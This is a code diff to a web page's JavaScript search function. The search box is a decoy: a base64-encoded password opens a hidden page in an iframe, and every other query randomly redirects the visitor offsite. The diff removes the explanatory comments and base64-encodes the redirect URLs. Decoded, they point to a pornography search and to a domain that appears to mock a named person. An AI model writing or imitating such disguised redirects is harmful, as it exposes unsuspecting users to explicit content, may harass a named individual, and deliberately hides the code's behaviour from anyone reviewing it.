@@ -119,34 +119,33 @@
         const contentFrame = document.getElementById('contentFrame');
 
         function performSearch() {
-    const searchTerm = searchInput.value.trim();
+  const searchTerm = searchInput.value.trim();
 
-    if (!searchTerm) {
-        alert('Please enter a search term');
-        return;
-    }
+  if (!searchTerm) {
+    alert('Please enter a search term');
+    return;
+  }
 
-    // Password logic (vibecoded)
-    if (searchTerm.toLowerCase() === atob('dmliZWNvZGVk')) {
-        contentFrame.src = atob('eDRrb25rb3IzLmh0bWw='); // x4konkor3.html (encoded)
-        iframeContainer.classList.add('active');
-        document.body.classList.add('iframe-mode');
-        return;
-    }
+  
+  if (searchTerm.toLowerCase() === atob('dmliZWNvZGVk')) {
+    contentFrame.src = atob('eDRrb25rb3IzLmh0bWw=');
+    iframeContainer.classList.add('active');
+    document.body.classList.add('iframe-mode');
+    return;
+  }
 
-    // Weighted random redirect (NOT iframe'd)
-    const r = Math.random();
+  const r = Math.random();
 
-    if (r < 0.15) {
-        // LOW percent (15%)
-        window.location.href = 'https://pornhub.com';
-    } else if (r < 0.45) {
-        // MEDIUM percent (30%)
-        window.location.href = 'https://skibidi.com';
-    } else {
-        // HIGH percent (55%)
-        window.location.href = 'https://andrewhuis.gay';
-    }
+  if (r < 0.15) {
+
+    window.location.href = atob('aHR0cHM6Ly93d3cucG9ybmh1Yi5jb20vdmlkZW8vc2VhcmNoP3NlYXJjaD1zeXNhZG1pbitzZXg=');
+  } else if (r < 0.45) {
+    
+    window.location.href = atob('aHR0cHM6Ly9jb3JuaHViLndlYnNpdGU=');
+  } else {
+    
+    window.location.href = atob('aHR0cHM6Ly9hbmRyZXdodWlzLmdheQo=');
+  }
 }
 
 
